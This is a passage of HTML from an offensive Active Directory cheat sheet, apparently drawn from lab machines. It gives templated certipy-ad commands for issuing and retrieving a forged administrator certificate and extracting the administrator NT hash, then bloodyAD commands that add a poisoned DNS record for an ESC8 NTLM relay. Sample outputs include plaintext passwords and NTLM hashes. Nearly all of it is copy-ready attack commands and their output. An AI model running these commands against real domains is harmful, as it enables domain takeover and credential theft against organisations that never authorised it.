</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -issue-request <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully issued certificate request ID 21
</span></span></span></div></pre></div><h4 id="5-request-a-certificate-from-ca-on-the-target-domain">5. Request a Certificate from CA on the Target Domain</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -retrieve <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Retrieving certificate with ID 21
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@manager.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Loaded private key from '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -retrieve <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Retrieving certificate with ID 21
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@manager.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Loaded private key from '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -retrieve <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven@manager.htb'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving certificate with ID 21
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@manager.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Loaded private key from '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -retrieve <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven@manager.htb'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving certificate with ID 21
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@manager.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Loaded private key from '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -retrieve <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven@manager.htb'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Retrieving certificate with ID 21
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@manager.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Loaded private key from '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><h4 id="6-get-ntlm-hash">6. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>.pfx -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad auth -pfx administrator.pfx -domain manager.htb -dc-ip 10.129.255.35
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN UPN: 'administrator@manager.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'administrator@manager.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'administrator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'administrator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
</span></span></span></div></pre></div></div></div><p></p>
<hr>
<h3 id="esc8-ntlm-relay-to-ad-cs-web-enrollment">ESC8: NTLM Relay to AD CS Web Enrollment</h3>
<p class="tabs">
<button data-tabset="set11" data-tabcontent="tab1" class="active">Linux</button>

<button data-tabset="set11" data-tabcontent="tab2">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set11"><div class="tabcontent active" data-tabset="set11" data-tabcontent="tab1"><h4 id="1-dns-poisoning">1. DNS Poisoning</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --host <span class="o editable-keyword">&lt;DC&gt;</span> add dnsRecord '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <span class="o editable-keyword">&lt;LOCAL_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -u <span class="s1">'Rosie.Powell'</span> -p <span class="s1">'Cicada123'</span> -d cicada.vl --host DC-JPQ225.cicada.vl add dnsRecord <span class="s1">'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'</span> 10.10.14.79
</span></span><span class="line"><span class="cl"><span class="go">[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --host <span class="o editable-keyword">&lt;DC&gt;</span> add dnsRecord '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <span class="o editable-keyword">&lt;LOCAL_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -u <span class="s1">'Rosie.Powell'</span> -p <span class="s1">':ff99630bed1e3bfd90e6a193d603113f'</span> -f rc4 -d cicada.vl --host DC-JPQ225.cicada.vl add dnsRecord <span class="s1">'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'</span> 10.10.14.79
</span></span><span class="line"><span class="cl"><span class="go">[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add dnsRecord '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <span class="o editable-keyword">&lt;LOCAL_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -u <span class="s1">'Rosie.Powell'</span> -p <span class="s1">'Cicada123'</span> -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord <span class="s1">'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'</span> 10.10.14.79   
</span></span><span class="line"><span class="cl"><span class="go">[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add dnsRecord '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <span class="o editable-keyword">&lt;LOCAL_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -u <span class="s1">'Rosie.Powell'</span> -p <span class="s1">':ff99630bed1e3bfd90e6a193d603113f'</span> -f rc4 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord <span class="s1">'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'</span> 10.10.14.79
</span></span><span class="line"><span class="cl"><span class="go">[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
